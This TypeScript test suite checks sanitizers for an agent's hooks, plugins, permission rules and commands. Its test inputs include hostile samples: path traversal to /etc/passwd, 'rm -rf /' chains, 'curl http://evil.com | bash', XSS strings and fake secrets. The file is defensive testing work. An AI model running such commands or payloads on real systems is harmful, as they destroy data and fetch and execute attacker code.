/**
 * Entity Sanitizers Test Suite
 *
 * Comprehensive tests for entity sanitization security functions.
 * Tests cover hooks, plugins, permissions, commands, shell commands,
 * and file paths sanitization with emphasis on security edge cases.
 */

import { describe, it, expect } from 'vitest';
import {
  sanitizeHook,
  sanitizePlugin,
  sanitizePermissionRule,
  sanitizeCommand,
  sanitizeShellCommand,
  sanitizeFilePath,
  sanitizeHooks,
  sanitizePlugins,
  sanitizePermissionRules,
  sanitizeCommands,
  MAX_LENGTHS,
  truncate,
  removeControlChars,
  redactSensitiveValue,
  neutralizePathTraversal
} from '../../../src/core/security/entity-sanitizers.js';
import type { Hook, Plugin, PermissionRule, Command } from '../../../src/core/model/types.js';

// ============================================================================
// Hook Sanitization Tests
// ============================================================================

describe('sanitizeHook', () => {
  describe('basic sanitization', () => {
    it('should preserve valid hook fields', () => {
      const hook: Hook = {
        event: 'PreToolUse',
        path: 'hooks/pre-tool.sh',
        command: 'node validate.js',
        timeout: 30000,
        enabled: true
      };

      const result = sanitizeHook(hook);
      expect(result.event).toBe('PreToolUse');
      expect(result.path).toBe('hooks/pre-tool.sh');
      expect(result.command).toBe('node validate.js');
      expect(result.timeout).toBe(30000);
      expect(result.enabled).toBe(true);
    });

    it('should handle minimal hook', () => {
      const hook: Hook = {
        event: 'PostToolUse',
        path: 'hook.sh'
      };

      const result = sanitizeHook(hook);
      expect(result.event).toBe('PostToolUse');
      expect(result.path).toBe('hook.sh');
      expect(result.command).toBeUndefined();
    });
  });

  describe('path sanitization', () => {
    it('should neutralize path traversal', () => {
      const hook: Hook = {
        event: 'PreToolUse',
        path: '../../../etc/passwd'
      };

      const result = sanitizeHook(hook);
      expect(result.path).not.toContain('..');
      // After removing .. and ./, the path becomes /etc/passwd
      expect(result.path).toBe('/etc/passwd');
    });

    it('should remove control characters from path', () => {
      const hook: Hook = {
        event: 'PreToolUse',
        path: 'hooks/test\x00.sh'
      };

      const result = sanitizeHook(hook);
      expect(result.path).not.toContain('\x00');
      expect(result.path).toBe('hooks/test.sh');
    });

    it('should truncate long paths', () => {
      const hook: Hook = {
        event: 'PreToolUse',
        path: './hooks/' + 'a'.repeat(600) + '.sh'
      };

      const result = sanitizeHook(hook);
      expect(result.path.length).toBeLessThanOrEqual(MAX_LENGTHS.hookPath);
    });
  });

  describe('command sanitization', () => {
    it('should redact password in command flag', () => {
      const hook: Hook = {
        event: 'PreToolUse',
        path: './hook.sh',
        command: 'curl --password=supersecret123 https://api.example.com'
      };

      const result = sanitizeHook(hook);
      expect(result.command).not.toContain('supersecret123');
      expect(result.command).toContain('--password=');
    });

    it('should redact API key environment variable', () => {
      const hook: Hook = {
        event: 'PreToolUse',
        path: './hook.sh',
        command: 'API_KEY=sk-abc123xyz789 node script.js'
      };

      const result = sanitizeHook(hook);
      expect(result.command).not.toContain('sk-abc123xyz789');
      expect(result.command).toContain('API_KEY=');
    });

    it('should redact multiple sensitive values', () => {
      const hook: Hook = {
        event: 'PreToolUse',
        path: './hook.sh',
        command: 'SECRET=abc123 --token=xyz789 --auth=password123'
      };

      const result = sanitizeHook(hook);
      expect(result.command).not.toContain('abc123');
      expect(result.command).not.toContain('xyz789');
      expect(result.command).not.toContain('password123');
    });

    it('should truncate long commands', () => {
      const hook: Hook = {
        event: 'PreToolUse',
        path: './hook.sh',
        command: 'echo ' + 'x'.repeat(2000)
      };

      const result = sanitizeHook(hook);
      expect(result.command!.length).toBeLessThanOrEqual(MAX_LENGTHS.hookCommand);
    });
  });

  describe('working directory sanitization', () => {
    it('should neutralize path traversal in working directory', () => {
      const hook: Hook = {
        event: 'PreToolUse',
        path: './hook.sh',
        workingDirectory: '../../../tmp'
      };

      const result = sanitizeHook(hook);
      expect(result.workingDirectory).not.toContain('..');
    });
  });

  describe('timeout sanitization', () => {
    it('should cap timeout at maximum', () => {
      const hook: Hook = {
        event: 'PreToolUse',
        path: './hook.sh',
        timeout: 999999999
      };

      const result = sanitizeHook(hook);
      expect(result.timeout).toBe(300000);
    });

    it('should enforce minimum timeout', () => {
      const hook: Hook = {
        event: 'PreToolUse',
        path: './hook.sh',
        timeout: 100
      };

      const result = sanitizeHook(hook);
      expect(result.timeout).toBe(1000);
    });
  });
});

// ============================================================================
// Plugin Sanitization Tests
// ============================================================================

describe('sanitizePlugin', () => {
  describe('basic sanitization', () => {
    it('should preserve valid plugin fields', () => {
      const plugin: Plugin = {
        id: 'my-plugin@official',
        name: 'My Plugin',
        enabled: true,
        marketplace: 'official',
        version: '1.2.3',
        description: 'A test plugin'
      };

      const result = sanitizePlugin(plugin);
      expect(result.id).toBe('my-plugin@official');
      expect(result.name).toBe('My Plugin');
      expect(result.enabled).toBe(true);
      expect(result.marketplace).toBe('official');
      expect(result.version).toBe('1.2.3');
      expect(result.description).toBe('A test plugin');
    });
  });

  describe('id sanitization', () => {
    it('should lowercase and clean plugin id', () => {
      const plugin: Plugin = {
        id: 'My-Plugin_Test@Official',
        name: 'Test',
        enabled: true
      };

      const result = sanitizePlugin(plugin);
      expect(result.id).toBe('my-plugin-test@official');
    });

    it('should remove control characters from id', () => {
      const plugin: Plugin = {
        id: 'plugin\x00test@official',
        name: 'Test',
        enabled: true
      };

      const result = sanitizePlugin(plugin);
      expect(result.id).not.toContain('\x00');
    });

    it('should truncate long ids', () => {
      const plugin: Plugin = {
        id: 'a'.repeat(200) + '@official',
        name: 'Test',
        enabled: true
      };

      const result = sanitizePlugin(plugin);
      expect(result.id.length).toBeLessThanOrEqual(MAX_LENGTHS.pluginId);
    });
  });

  describe('name sanitization', () => {
    it('should remove HTML tags from name', () => {
      const plugin: Plugin = {
        id: 'test@official',
        name: '<script>alert(1)</script>My Plugin',
        enabled: true
      };

      const result = sanitizePlugin(plugin);
      expect(result.name).not.toContain('<script>');
      expect(result.name).toContain('My Plugin');
    });

    it('should remove JavaScript protocol from name', () => {
      const plugin: Plugin = {
        id: 'test@official',
        name: 'javascript:alert(1)Plugin',
        enabled: true
      };

      const result = sanitizePlugin(plugin);
      expect(result.name).not.toContain('javascript:');
    });
  });

  describe('source sanitization', () => {
    it('should validate and preserve HTTPS URLs', () => {
      const plugin: Plugin = {
        id: 'test@official',
        name: 'Test',
        enabled: true,
        source: {
          type: 'github',
          location: 'https://github.com/org/repo'
        }
      };

      const result = sanitizePlugin(plugin);
      expect(result.source?.location).toBe('https://github.com/org/repo');
    });

    it('should mark invalid URLs', () => {
      const plugin: Plugin = {
        id: 'test@official',
        name: 'Test',
        enabled: true,
        source: {
          type: 'url',
          location: 'javascript:alert(1)'
        }
      };

      const result = sanitizePlugin(plugin);
      expect(result.source?.location).toContain('invalid');
    });

    it('should neutralize path traversal in file source', () => {
      const plugin: Plugin = {
        id: 'test@official',
        name: 'Test',
        enabled: true,
        source: {
          type: 'file',
          location: '../../../etc/passwd'
        }
      };

      const result = sanitizePlugin(plugin);
      expect(result.source?.location).not.toContain('..');
    });

    it('should default invalid source type', () => {
      const plugin: Plugin = {
        id: 'test@official',
        name: 'Test',
        enabled: true,
        source: {
          type: 'malicious' as any,
          location: 'https://example.com'
        }
      };

      const result = sanitizePlugin(plugin);
      expect(result.source?.type).toBe('url');
    });
  });
});

// ============================================================================
// Permission Rule Sanitization Tests
// ============================================================================

describe('sanitizePermissionRule', () => {
  describe('basic sanitization', () => {
    it('should preserve valid permission rule', () => {
      const rule: PermissionRule = {
        pattern: 'Read(*)',
        type: 'allow',
        tool: 'Read',
        description: 'Allow reading all files'
      };

      const result = sanitizePermissionRule(rule);
      expect(result.pattern).toBe('Read(*)');
      expect(result.type).toBe('allow');
      expect(result.tool).toBe('Read');
      expect(result.description).toBe('Allow reading all files');
    });
  });

  describe('pattern sanitization', () => {
    it('should neutralize path traversal in pattern', () => {
      const rule: PermissionRule = {
        pattern: 'Read(../../../etc/passwd)',
        type: 'allow'
      };

      const result = sanitizePermissionRule(rule);
      expect(result.pattern).not.toContain('..');
    });

    it('should sanitize special characters in pattern argument', () => {
      const rule: PermissionRule = {
        pattern: 'Read(<script>*</script>)',
        type: 'allow'
      };

      const result = sanitizePermissionRule(rule);
      expect(result.pattern).not.toContain('<script>');
    });

    it('should preserve glob patterns', () => {
      const rule: PermissionRule = {
        pattern: 'Read(./src/**/*.ts)',
        type: 'allow'
      };

      const result = sanitizePermissionRule(rule);
      expect(result.pattern).toContain('*');
    });

    it('should truncate long patterns', () => {
      const rule: PermissionRule = {
        pattern: 'Read(' + 'a'.repeat(300) + ')',
        type: 'allow'
      };

      const result = sanitizePermissionRule(rule);
      expect(result.pattern.length).toBeLessThanOrEqual(MAX_LENGTHS.permissionPattern);
    });
  });

  describe('type sanitization', () => {
    it('should default invalid type to ask', () => {
      const rule: PermissionRule = {
        pattern: 'Read(*)',
        type: 'invalid' as any
      };

      const result = sanitizePermissionRule(rule);
      expect(result.type).toBe('ask');
    });

    it('should preserve valid types', () => {
      const types: PermissionRule['type'][] = ['allow', 'deny', 'ask'];

      for (const type of types) {
        const rule: PermissionRule = {
          pattern: 'Read(*)',
          type
        };

        const result = sanitizePermissionRule(rule);
        expect(result.type).toBe(type);
      }
    });
  });

  describe('description sanitization', () => {
    it('should remove HTML from description', () => {
      const rule: PermissionRule = {
        pattern: 'Read(*)',
        type: 'allow',
        description: '<b>Important</b> rule for <script>bad</script>'
      };

      const result = sanitizePermissionRule(rule);
      expect(result.description).not.toContain('<b>');
      expect(result.description).not.toContain('<script>');
    });
  });
});

// ============================================================================
// Command Sanitization Tests
// ============================================================================

describe('sanitizeCommand', () => {
  describe('basic sanitization', () => {
    it('should preserve valid command', () => {
      const command: Command = {
        name: '/build',
        description: 'Build the project',
        allowedTools: ['Bash', 'Read'],
        prompt: 'Build using npm'
      };

      const result = sanitizeCommand(command);
      expect(result.name).toBe('/build');
      expect(result.description).toBe('Build the project');
      expect(result.allowedTools).toEqual(['Bash', 'Read']);
      expect(result.prompt).toBe('Build using npm');
    });
  });

  describe('name sanitization', () => {
    it('should ensure name starts with slash', () => {
      const command: Command = {
        name: 'deploy'
      };

      const result = sanitizeCommand(command);
      expect(result.name).toBe('/deploy');
    });

    it('should remove invalid characters from name', () => {
      const command: Command = {
        name: '/deploy!@#test'
      };

      const result = sanitizeCommand(command);
      expect(result.name).toBe('/deploytest');
    });

    it('should remove HTML from name', () => {
      const command: Command = {
        name: '/<script>hack</script>test'
      };

      const result = sanitizeCommand(command);
      expect(result.name).not.toContain('<script>');
    });
  });

  describe('tool list sanitization', () => {
    it('should filter to known tools in allowedTools', () => {
      const command: Command = {
        name: '/test',
        allowedTools: ['Bash', 'UnknownTool', 'Read', 'FakeTool']
      };

      const result = sanitizeCommand(command);
      expect(result.allowedTools).toEqual(['Bash', 'Read']);
    });

    it('should clean tool names in disallowedTools', () => {
      const command: Command = {
        name: '/test',
        disallowedTools: ['<script>Bash</script>', 'Write!@#']
      };

      const result = sanitizeCommand(command);
      expect(result.disallowedTools).toEqual(['scriptBashscript', 'Write']);
    });
  });

  describe('prompt sanitization', () => {
    it('should replace command substitution', () => {
      const command: Command = {
        name: '/test',
        prompt: 'Run this: $(rm -rf /)'
      };

      const result = sanitizeCommand(command);
      expect(result.prompt).not.toContain('$(');
      expect(result.prompt).toContain('[command]');
    });

    it('should replace backtick substitution', () => {
      const command: Command = {
        name: '/test',
        prompt: 'Execute: `whoami`'
      };

      const result = sanitizeCommand(command);
      expect(result.prompt).not.toContain('`');
      expect(result.prompt).toContain('[command]');
    });

    it('should replace variable expansion', () => {
      const command: Command = {
        name: '/test',
        prompt: 'Use ${HOME} and $PATH'
      };

      const result = sanitizeCommand(command);
      expect(result.prompt).not.toContain('${');
      expect(result.prompt).not.toContain('$PATH');
      expect(result.prompt).toContain('[var]');
    });

    it('should truncate long prompts', () => {
      const command: Command = {
        name: '/test',
        prompt: 'x'.repeat(10000)
      };

      const result = sanitizeCommand(command);
      expect(result.prompt!.length).toBeLessThanOrEqual(MAX_LENGTHS.commandPrompt);
    });
  });
});

// ============================================================================
// Shell Command Sanitization Tests
// ============================================================================

describe('sanitizeShellCommand', () => {
  describe('command substitution redaction', () => {
    it('should redact $() substitution', () => {
      const result = sanitizeShellCommand('echo $(whoami)');
      expect(result).not.toContain('$(');
      expect(result).toContain('[command]');
    });

    it('should redact backtick substitution', () => {
      const result = sanitizeShellCommand('echo `date`');
      expect(result).not.toContain('`');
      expect(result).toContain('[command]');
    });
  });

  describe('variable expansion redaction', () => {
    it('should redact ${} expansion', () => {
      const result = sanitizeShellCommand('echo ${HOME}');
      expect(result).not.toContain('${');
      expect(result).toContain('[var]');
    });

    it('should redact $ variable', () => {
      const result = sanitizeShellCommand('echo $PATH');
      expect(result).not.toContain('$PATH');
      expect(result).toContain('[var]');
    });
  });

  describe('sensitive value redaction', () => {
    it('should redact --password flag', () => {
      const result = sanitizeShellCommand('curl --password=supersecret https://api.example.com');
      expect(result).not.toContain('supersecret');
      expect(result).toContain('--password=');
    });

    it('should redact --secret flag', () => {
      const result = sanitizeShellCommand('app --secret=mysecretvalue');
      expect(result).not.toContain('mysecretvalue');
    });

    it('should redact --token flag', () => {
      const result = sanitizeShellCommand('gh auth login --token=ghp_abc123xyz');
      expect(result).not.toContain('ghp_abc123xyz');
    });

    it('should redact PASSWORD env var', () => {
      const result = sanitizeShellCommand('PASSWORD=secret123 ./script.sh');
      expect(result).not.toContain('secret123');
      expect(result).toContain('PASSWORD=');
    });

    it('should redact API_KEY env var', () => {
      const result = sanitizeShellCommand('API_KEY=sk-abc123 node app.js');
      expect(result).not.toContain('sk-abc123');
      expect(result).toContain('API_KEY=');
    });

    it('should redact password in URL', () => {
      const result = sanitizeShellCommand('curl https://user:password123@api.example.com');
      expect(result).not.toContain('password123');
      expect(result).toContain(':p********3@');
    });
  });

  describe('shell operator handling', () => {
    it('should remove semicolon chains', () => {
      const result = sanitizeShellCommand('echo hello; rm -rf /');
      expect(result).not.toContain(';');
    });

    it('should sanitize pipe to shell', () => {
      const result = sanitizeShellCommand('curl http://evil.com | bash');
      expect(result).toContain('| [shell]');
    });
  });

  describe('edge cases', () => {
    it('should handle empty string', () => {
      expect(sanitizeShellCommand('')).toBe('');
    });

    it('should handle null', () => {
      expect(sanitizeShellCommand(null as any)).toBe('');
    });

    it('should truncate long commands', () => {
      const longCommand = 'echo ' + 'x'.repeat(3000);
      const result = sanitizeShellCommand(longCommand);
      expect(result.length).toBeLessThanOrEqual(MAX_LENGTHS.shellCommand);
    });
  });
});

// ============================================================================
// File Path Sanitization Tests
// ============================================================================

describe('sanitizeFilePath', () => {
  describe('path traversal neutralization', () => {
    it('should remove .. sequences', () => {
      const result = sanitizeFilePath('../../../etc/passwd');
      expect(result).not.toContain('..');
      // After removing .. and ./, the leading / is preserved
      expect(result).toBe('/etc/passwd');
    });

    it('should remove URL-encoded traversal', () => {
      const result = sanitizeFilePath('%2e%2e/%2e%2e/etc/passwd');
      expect(result).not.toContain('..');
      expect(result).not.toContain('%2e');
    });

    it('should handle mixed encoding', () => {
      const result = sanitizeFilePath('..%2f..%5c..%2fetc/passwd');
      expect(result).not.toContain('..');
    });
  });

  describe('control character removal', () => {
    it('should remove null bytes', () => {
      const result = sanitizeFilePath('/path/to/file\x00.txt');
      expect(result).not.toContain('\x00');
      expect(result).toBe('/path/to/file.txt');
    });

    it('should remove other control characters', () => {
      const result = sanitizeFilePath('/path/to/\x1ffile.txt');
      expect(result).not.toContain('\x1f');
    });
  });

  describe('invalid character removal', () => {
    it('should remove < and > characters', () => {
      const result = sanitizeFilePath('/path/<file>.txt');
      expect(result).not.toContain('<');
      expect(result).not.toContain('>');
    });

    it('should remove pipe character', () => {
      const result = sanitizeFilePath('/path/file|name.txt');
      expect(result).not.toContain('|');
    });

    it('should remove question mark', () => {
      const result = sanitizeFilePath('/path/file?.txt');
      expect(result).not.toContain('?');
    });
  });

  describe('path normalization', () => {
    it('should normalize backslashes to forward slashes', () => {
      const result = sanitizeFilePath('path\\to\\file.txt');
      expect(result).not.toContain('\\');
      expect(result).toContain('/');
    });

    it('should remove multiple consecutive slashes', () => {
      const result = sanitizeFilePath('/path///to//file.txt');
      expect(result).toBe('/path/to/file.txt');
    });

    it('should trim whitespace', () => {
      const result = sanitizeFilePath('  /path/to/file.txt  ');
      expect(result).toBe('/path/to/file.txt');
    });
  });

  describe('edge cases', () => {
    it('should handle empty string', () => {
      expect(sanitizeFilePath('')).toBe('');
    });

    it('should handle null', () => {
      expect(sanitizeFilePath(null as any)).toBe('');
    });

    it('should truncate long paths', () => {
      const longPath = '/path/to/' + 'a'.repeat(2000) + '/file.txt';
      const result = sanitizeFilePath(longPath);
      expect(result.length).toBeLessThanOrEqual(MAX_LENGTHS.filePath);
    });
  });
});

// ============================================================================
// Batch Sanitization Tests
// ============================================================================

describe('batch sanitization', () => {
  describe('sanitizeHooks', () => {
    it('should sanitize multiple hooks', () => {
      const hooks: Hook[] = [
        { event: 'PreToolUse', path: '../../../etc/passwd' },
        { event: 'PostToolUse', path: './hook.sh', command: 'SECRET=abc123 node app.js' }
      ];

      const results = sanitizeHooks(hooks);
      expect(results).toHaveLength(2);
      expect(results[0].path).not.toContain('..');
      expect(results[1].command).not.toContain('abc123');
    });
  });

  describe('sanitizePlugins', () => {
    it('should sanitize multiple plugins', () => {
      const plugins: Plugin[] = [
        { id: 'Plugin@Official', name: '<script>test</script>', enabled: true },
        { id: 'test@market', name: 'Valid', enabled: false }
      ];

      const results = sanitizePlugins(plugins);
      expect(results).toHaveLength(2);
      expect(results[0].id).toBe('plugin@official');
      expect(results[0].name).not.toContain('<script>');
    });
  });

  describe('sanitizePermissionRules', () => {
    it('should sanitize multiple rules', () => {
      const rules: PermissionRule[] = [
        { pattern: 'Read(../../../etc/passwd)', type: 'allow' },
        { pattern: 'Write(*)', type: 'invalid' as any }
      ];

      const results = sanitizePermissionRules(rules);
      expect(results).toHaveLength(2);
      expect(results[0].pattern).not.toContain('..');
      expect(results[1].type).toBe('ask');
    });
  });

  describe('sanitizeCommands', () => {
    it('should sanitize multiple commands', () => {
      const commands: Command[] = [
        { name: 'deploy', prompt: '$(rm -rf /)' },
        { name: '/test', allowedTools: ['Bash', 'FakeTool'] }
      ];

      const results = sanitizeCommands(commands);
      expect(results).toHaveLength(2);
      expect(results[0].name).toBe('/deploy');
      expect(results[0].prompt).toContain('[command]');
      expect(results[1].allowedTools).toEqual(['Bash']);
    });
  });
});

// ============================================================================
// Utility Function Tests
// ============================================================================

describe('utility functions', () => {
  describe('truncate', () => {
    it('should truncate long strings with ellipsis', () => {
      const result = truncate('a'.repeat(100), 50);
      expect(result.length).toBe(50);
      expect(result.endsWith('...')).toBe(true);
    });

    it('should preserve short strings', () => {
      const result = truncate('hello', 50);
      expect(result).toBe('hello');
    });

    it('should handle empty string', () => {
      expect(truncate('', 50)).toBe('');
    });

    it('should handle exact length', () => {
      const result = truncate('hello', 5);
      expect(result).toBe('hello');
    });
  });

  describe('removeControlChars', () => {
    it('should remove null bytes', () => {
      expect(removeControlChars('hello\x00world')).toBe('helloworld');
    });

    it('should remove all control characters', () => {
      expect(removeControlChars('hello\x01\x02\x1fworld')).toBe('helloworld');
    });

    it('should preserve normal text', () => {
      expect(removeControlChars('Hello World!')).toBe('Hello World!');
    });

    it('should handle empty string', () => {
      expect(removeControlChars('')).toBe('');
    });
  });

  describe('redactSensitiveValue', () => {
    it('should redact long values', () => {
      const result = redactSensitiveValue('supersecret123');
      expect(result).toBe('s********3');
    });

    it('should fully redact short values', () => {
      const result = redactSensitiveValue('abc');
      expect(result).toBe('****');
    });

    it('should handle exact boundary', () => {
      const result = redactSensitiveValue('abcd');
      expect(result).toBe('****');
    });

    it('should limit asterisks to 8', () => {
      const result = redactSensitiveValue('a'.repeat(50));
      expect(result.match(/\*/g)?.length).toBe(8);
    });
  });

  describe('neutralizePathTraversal', () => {
    it('should remove .. sequences', () => {
      // After removing .., the / is preserved
      expect(neutralizePathTraversal('../test')).toBe('/test');
    });

    it('should handle multiple traversal sequences', () => {
      // After removing ../, the leading / is preserved
      expect(neutralizePathTraversal('../../../etc')).toBe('/etc');
    });

    it('should remove URL-encoded sequences', () => {
      expect(neutralizePathTraversal('%2e%2e/test')).toBe('/test');
    });

    it('should normalize slashes', () => {
      expect(neutralizePathTraversal('path//to///file')).toBe('path/to/file');
    });
  });
});
